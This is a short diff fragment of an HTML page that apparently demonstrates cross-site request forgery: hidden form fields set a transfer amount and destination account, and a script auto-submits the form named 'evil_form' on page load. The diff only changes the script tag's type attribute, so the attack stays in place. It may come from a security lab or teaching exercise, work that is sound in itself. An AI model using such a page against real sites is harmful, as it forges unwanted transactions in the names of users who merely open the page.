@@ -9,7 +9,7 @@
   <input type="hidden" name="amount" value="50">
   <input type="hidden" name="dest" value="123456">
 </form>
-<script>$('#evil_form').submit();</script>
+<script type="text/javascript">$('#evil_form').submit();</script>
 
 
 </body>
